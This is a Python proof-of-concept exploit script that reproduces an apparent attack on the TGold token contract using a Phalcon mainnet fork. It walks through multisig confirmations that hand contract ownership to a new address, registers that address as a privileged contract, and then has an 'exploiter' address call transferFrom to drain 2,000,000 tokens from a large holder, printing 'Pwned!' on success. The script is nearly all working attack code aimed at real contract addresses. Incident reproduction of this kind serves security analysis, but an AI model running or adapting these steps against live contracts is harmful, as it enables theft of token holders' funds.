from datetime import datetime
from web3 import Web3
import requests,json
import sys

### Put you Phalcon access_key here! Donot share you access key to others.
ACCESS_KEY = ''
FORK_NAME = 'TGoldPoC'
FORK_NUMBER = 17038763

def date():
  current_date = datetime.fromtimestamp(w3.eth.get_block("latest")['timestamp']).strftime("%d %B, %Y, %H:%M:%S")
  print(f"It's {current_date}")

def success(tx_hash):
  if w3.eth.wait_for_transaction_receipt(tx_hash)['status'] != 1:
    print('[Failed]')
    raise Exception("TX failed.")

############### constant ####################################

TGGOLD_OWNER = Web3.toChecksumAddress("0xC6CDE7C39eB2f0F0095F41570af89eFC2C1Ea828")
TGOLD_CONTRACT = Web3.toChecksumAddress("0x68749665FF8D2d112Fa859AA293F07A622782F38")
TGGOLD_NEW_OWNER = Web3.toChecksumAddress("0x189E7947a9D9210eec3a41dcf5F536bb1D7726f5")

TGGOLD_BIG_OWNER = Web3.toChecksumAddress("0x785f041A4DAe0C1E5eDcBB081F1a2BB9684eFF76")

MULTTSIG_SIGNER1 = Web3.toChecksumAddress("0xac3b242e2e561da9f4ce34746e67d004e6341fa0")
MULTTSIG_SIGNER2 = Web3.toChecksumAddress("0xEe5207d3c88562fc814496Af0845B34CFD4afc8c") 
MULTTSIG_SIGNER3 = Web3.toChecksumAddress("0x61D5a4d5Bd270e59E9320243e574288e2a199fED") 
MULTISIG_CONTRACT = Web3.toChecksumAddress("0xc6cde7c39eb2f0f0095f41570af89efc2c1ea828")

EXPLOITER = Web3.toChecksumAddress("0x14c4fffd8748cf0e23af945a11eeabc3416dd4c1")

TGOLD_CONTRACT_ABI = '[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_user","type":"address"}],"name":"BlockPlaced","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_user","type":"address"}],"name":"BlockReleased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_blockedUser","type":"address"},{"indexed":false,"internalType":"uint256","name":"_balance","type":"uint256"}],"name":"DestroyedBlockedFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_destination","type":"address"},{"indexed":false,"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"Mint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_contract","type":"address"}],"name":"NewPrivilegedContract","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_contract","type":"address"}],"name":"RemovedPrivilegedContract","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_trustedDeFiContract","type":"address"}],"name":"addPrivilegedContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"addToBlockedList","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"},{"internalType":"address","name":"_spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_blockedUser","type":"address"}],"name":"destroyBlockedFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint8","name":"_decimals","type":"uint8"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBlocked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isTrusted","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_destination","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"_recipients","type":"address[]"},{"internalType":"uint256[]","name":"_values","type":"uint256[]"}],"name":"multiTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"redeem","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"removeFromBlockedList","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_trustedDeFiContract","type":"address"}],"name":"removePrivilegedContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_recipient","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_sender","type":"address"},{"internalType":"address","name":"_recipient","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]'


MULTISIG_CONTRACT_ABI = '[{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"owners","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"owner","type":"address"}],"name":"removeOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"revokeConfirmation","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isOwner","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"},{"name":"","type":"address"}],"name":"confirmations","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"pending","type":"bool"},{"name":"executed","type":"bool"}],"name":"getTransactionCount","outputs":[{"name":"count","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"owner","type":"address"}],"name":"addOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"isConfirmed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"getConfirmationCount","outputs":[{"name":"count","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"transactions","outputs":[{"name":"destination","type":"address"},{"name":"value","type":"uint256"},{"name":"data","type":"bytes"},{"name":"executed","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"getOwners","outputs":[{"name":"","type":"address[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"from","type":"uint256"},{"name":"to","type":"uint256"},{"name":"pending","type":"bool"},{"name":"executed","type":"bool"}],"name":"getTransactionIds","outputs":[{"name":"_transactionIds","type":"uint256[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"getConfirmations","outputs":[{"name":"_confirmations","type":"address[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"transactionCount","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_required","type":"uint256"}],"name":"changeRequirement","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"confirmTransaction","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"destination","type":"address"},{"name":"value","type":"uint256"},{"name":"data","type":"bytes"}],"name":"submitTransaction","outputs":[{"name":"transactionId","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_OWNER_COUNT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"required","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"owner","type":"address"},{"name":"newOwner","type":"address"}],"name":"replaceOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"transactionId","type":"uint256"}],"name":"executeTransaction","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_owners","type":"address[]"},{"name":"_required","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"sender","type":"address"},{"indexed":true,"name":"transactionId","type":"uint256"}],"name":"Confirmation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"sender","type":"address"},{"indexed":true,"name":"transactionId","type":"uint256"}],"name":"Revocation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"transactionId","type":"uint256"}],"name":"Submission","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"transactionId","type":"uint256"}],"name":"Execution","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"transactionId","type":"uint256"}],"name":"ExecutionFailure","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"sender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"}],"name":"OwnerAddition","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"}],"name":"OwnerRemoval","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"required","type":"uint256"}],"name":"RequirementChange","type":"event"}]'

def get_enough_ether(addr):
  balance = w3.fromWei(w3.eth.get_balance(addr), 'ether')
  if (balance < 1):
    print ('[*] Insufficent fund in "%s". Get some Ether from vitalik.' % (addr))
    txhash = w3.eth.send_transaction({
    'to': addr,
    'from': '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045',
    'value': w3.toWei(10, 'ether'),
    })
    success(txhash)


def send_fork_request(url, d = None):
  response = requests.post(url, data = d, headers={'Access-Key': ACCESS_KEY, 'Content-Type': 'application/json'})
  response.raise_for_status()
  json_response = response.json()

  if json_response['code'] != 0:
    print ('[*] error ' + json_response['message'])
    return [False, None]
  
  return [True, json_response['data']]

print ("--------------------start --------------------")

# Create a Fork if it does not exist
url = 'https://api.phalcon.xyz/v1/fork/list'
forks = send_fork_request(url)
if (forks[0] != True):
  print ('[x] something is wrong when querying Forks!')
  sys.exit(-1)

fork_rpc = ''
for l in forks[1]:
  if (l['name'] == FORK_NAME):
    fork_rpc = l['rpc']
    break

if (fork_rpc == ''):
  print ('[*] create a Fork for the PoC!')
  url = 'https://api.phalcon.xyz/v1/fork/create'
  json = '{"chainId":1, "height" : "' + ('0x%0.2X' % FORK_NUMBER) + '", "name" : "' + FORK_NAME +'", "position":0, "antiReplay": false}'
  forks = send_fork_request(url,json)
  if (forks[0] == True):
    fork_rpc = forks[1]['rpc']


w3 = Web3(Web3.HTTPProvider(fork_rpc))
#tggold contract
tgold_contract = w3.eth.contract(address=TGOLD_CONTRACT, abi=TGOLD_CONTRACT_ABI)
multisig_contract = w3.eth.contract(address=MULTISIG_CONTRACT, abi=MULTISIG_CONTRACT_ABI)

#check
get_enough_ether(TGGOLD_NEW_OWNER)
get_enough_ether(EXPLOITER)


## Step 1: make a new owner

########### step 1.1 submit transaction to tranfer ownership

## submit a transaction to multisign wallet
txhash = w3.eth.send_transaction({
  'to': MULTISIG_CONTRACT,
  'from': MULTTSIG_SIGNER1,
  'value': 0,
  'data' : 
  multisig_contract.encodeABI (fn_name='submitTransaction', 
  args=[TGOLD_CONTRACT, 0, tgold_contract.encodeABI(fn_name='transferOwnership', args=[TGGOLD_NEW_OWNER])])
})
print ('[*] %s Submit a transaction in the multisig wallet to transferOwnership to %s.' % (MULTTSIG_SIGNER1, TGGOLD_NEW_OWNER))
success(txhash)

############ step 1.2 confirm the transaction to tranfer ownership

proposal_id = multisig_contract.caller().transactionCount() -1
print ("proposal_id: " + str(proposal_id))
txhash = w3.eth.send_transaction({
  'to': MULTISIG_CONTRACT,
  'from': MULTTSIG_SIGNER2,
  'value': 0,
  'data' : 
  multisig_contract.encodeABI (fn_name='confirmTransaction', args=[proposal_id])
})
print ('[*] Confirmed the transaction by %s.' % (MULTTSIG_SIGNER2))
success(txhash)


txhash = w3.eth.send_transaction({
  'to': MULTISIG_CONTRACT,
  'from': MULTTSIG_SIGNER3,
  'value': 0,
  'data' : 
  multisig_contract.encodeABI (fn_name='confirmTransaction', args=[proposal_id])
})
print ('[*] Confirmed the transaction by %s.' % (MULTTSIG_SIGNER3))
success(txhash)

## query ownership
pool_owner = tgold_contract.caller().owner()
print ('[*] The pool owner is "%s"'%(pool_owner))

## step 2: use new owner to add a trsut contract
txhash = w3.eth.send_transaction({
  'to': TGOLD_CONTRACT,
  'from': TGGOLD_NEW_OWNER,
  'value': 0,
  'data' : 
  tgold_contract.encodeABI (fn_name='addPrivilegedContract', args=[TGGOLD_NEW_OWNER])
})
print ('[*] Add a new owner "%s" to TGold contract '%(TGGOLD_NEW_OWNER))
success(txhash)

balance_before = tgold_contract.caller().balanceOf(TGGOLD_NEW_OWNER)
print ("[*] Before the attack - balance: " + str(balance_before))

# ## EXPLOIT: transfer the TGGOLD_BIG_OWNER token to TGGOLD_NEW_OWNER
txhash = w3.eth.send_transaction({
'to': TGOLD_CONTRACT,
'from': EXPLOITER,
'value': 0,
'data' : 
tgold_contract.encodeABI (fn_name='transferFrom', args=[TGGOLD_BIG_OWNER, TGGOLD_NEW_OWNER, 2000000])
})
print ("[*] Lunch the attack")
success(txhash)

balance_after = tgold_contract.caller().balanceOf(TGGOLD_NEW_OWNER)
print ("[*] After the attack - balance: " + str(balance_after))

if (balance_after > balance_before) :
  print ("[*] Pwned!")

